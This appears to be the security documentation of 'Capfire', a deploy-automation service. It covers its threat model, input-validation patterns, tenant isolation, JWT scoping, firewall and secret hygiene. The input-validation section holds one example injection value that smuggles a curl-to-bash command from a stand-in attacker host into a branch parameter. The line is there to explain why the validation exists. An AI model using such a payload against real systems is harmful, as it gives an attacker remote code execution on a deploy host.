# Security

## Threat model

Capfire lives on a **deploy host** and has, by design:

- Shell access as the `capfire` user (it runs `sh -c <deploy command>`).
- A Postgres database with token metadata (no secret material — the JWT
  secret lives in the env file, not the DB).
- The ability to call the Cloudflare API if you configured LB drains.

Compromising Capfire is equivalent to compromising every app it can
deploy. Treat the node like a production host: minimal surface,
monitored, behind a private network.

## Input validation

Every HTTP parameter that ends up inside a shell command is validated at
controller level against a whitelist pattern (in
`app/controllers/application_controller.rb`):

| Parameter | Pattern | Notes |
|---|---|---|
| `app` | `\A[a-zA-Z0-9][a-zA-Z0-9_-]{0,62}\z` | Project slugs only |
| `env` | `\A[a-zA-Z0-9][a-zA-Z0-9_-]{0,31}\z` | `production`, `staging`, `qa-eu`, ... |
| `branch` | `\A[a-zA-Z0-9][a-zA-Z0-9._/-]{0,254}\z` | Plus `..` sequences rejected explicitly |
| `cmd` | whitelist | `restart`/`rollback`/`status` for `/commands` |
| `status` | whitelist | Deploy::STATUSES enum only |

Values that fail validation return `400 Bad Request` with a generic
message — we never reflect the rejected value back, so an attacker
cannot use the error payload as an oracle.

This matters because the final deploy command is built by
`sh -c "<template with %{branch} substituted>"`. A missing validation
here would turn `branch=$(curl evil.com/sh | bash)` into RCE as the
`capfire` user.

## Tenant isolation

- `GET /deploys` only returns rows where `triggered_by = sub` of the
  current token — you never see other people's runs.
- `GET /deploys/:id` requires the same `triggered_by` match; anything
  else returns 404. Stops log exfiltration across users.
- `CAPFIRE_ALLOWED_APPS` is the ultimate per-host safety net: even if
  someone signs a token with `apps: ["*"]` against a stolen secret,
  only the listed apps can be deployed on this node.

## Why JWT with claims

Capfire tokens are not opaque strings — they are JWTs signed with
`CAPFIRE_JWT_SECRET`, carrying explicit per-action permissions.

- **Least privilege**: each caller receives exactly what they need
  (`apps`, `envs`, `cmds`). A CI token for staging can't touch production
  even if stolen.
- **Individual revocation**: revoking one compromised token does not
  force you to rotate the global secret and invalidate every other token.
  `capfire tokens revoke` is enough.
- **Audit trail**: every deploy row stores `triggered_by` (the `sub`
  claim) and the `jti`. You can always answer "who ran this and when."
- **Optional expiry**: short-lived tokens (`--expires-in=1h`) are cheap
  for ephemeral CI pipelines.

## HTTPS is mandatory

Capfire never terminates TLS itself. Put Nginx, Caddy, or a managed LB in
front. Without HTTPS, every bearer token travels in plaintext and any
network observer can hijack a deploy.

See [setup.md § Nginx](setup.md#nginx-sse-proxy) for an SSE-safe config.

## Firewall

Never expose Capfire to the public internet. Options:

```
# UFW — allow only the internal network
sudo ufw allow from 10.0.0.0/8 to any port 443

# For GitHub Actions from the public internet, prefer a tunnel:
#   - Cloudflare Tunnel, or
#   - Tailscale GitHub Action runners.
```

If you must expose it publicly, at minimum:

- Enforce token expiry (`--expires-in=…`).
- Put a WAF rule that rate-limits `/deploys` and `/commands`.
- Monitor `/deploys` responses for 409/403 spikes.

## JWT secret hygiene

`CAPFIRE_JWT_SECRET` should:

- Be generated by a CSPRNG (the installer uses `openssl rand -hex 64` →
  512 bits).
- Live only in `/etc/capfire/env` (mode 0640, group `capfire`).
- Never be committed anywhere or shared across environments.
- Never be rotated casually — rotation invalidates every outstanding
  token. Prefer revocation.

## Apps allowlist

In multi-tenant setups, set `CAPFIRE_ALLOWED_APPS=app-a,app-b` in
`/etc/capfire/env`. Even if someone mints a token with `apps: ["*"]`
against a stolen JWT secret (worst case), only the listed apps are
deployable on this node. The allowlist is a per-host safety net, not a
substitute for token scoping.

## Database permissions

Give Capfire its own Postgres role that:

- Owns the `capfire_production` database and nothing else.
- Has NO `SUPERUSER`, `CREATEDB`, or `CREATEROLE`.
- Uses a password stored only in `DATABASE_URL` inside `/etc/capfire/env`.

## Production checklist

- [ ] HTTPS in front of Capfire (Nginx with `proxy_buffering off;`).
- [ ] Capfire not reachable from the public internet (firewall / VPN / tunnel).
- [ ] `CAPFIRE_JWT_SECRET` generated by `openssl rand -hex 64`, stored in
      `/etc/capfire/env` with mode 0640.
- [ ] `DATABASE_URL` points at a dedicated DB user with least privileges.
- [ ] `CAPFIRE_ALLOWED_APPS` set (even if it includes every app — forces
      you to be deliberate).
- [ ] Admin JWTs created without `--expires-in`, CI JWTs always with
      `--expires-in`.
- [ ] `api_tokens` table audited periodically (`capfire tokens list`).
- [ ] Slack or email alert on 5xx from `/deploys` and on
      `journalctl -u capfire -p err`.
- [ ] Backup strategy for `/etc/capfire/env` (secret) and the Postgres DB
      (audit log).
